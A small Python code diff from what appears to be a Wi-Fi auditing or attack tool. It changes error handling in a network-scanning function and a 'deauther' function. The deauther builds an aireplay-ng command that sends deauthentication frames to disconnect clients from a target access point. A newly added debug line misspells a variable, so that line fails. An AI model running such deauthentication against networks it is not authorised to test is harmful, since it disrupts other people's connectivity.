@@ -1434,12 +1434,12 @@ def getSSID():
     res = execcmd(cmd)
     if(res==-1):
         displayError()
-        exit()
+        return()
     cmd="rm -rf reportAiro*"
     toDEl = execcmd(cmd)
     if(toDEl==-1):
         displayError()
-        exit()
+        return()
     res = str(res).replace("\\r","").split("\\n")
     del res[0]
     del res[0]
@@ -1518,11 +1518,12 @@ def deauther():
     #name,channel,mac
     DisplayText("this will work","for 10 second","","","","","")
     target= target.split(",")
+    print(targe[2])
     cmd="aireplay-ng -0 10 -a " + target[2] + " wlan0mon"
     res = execcmd(cmd)
     if(res==-1):
         displayError()
-        exit()
+        return()
     return()
     
         
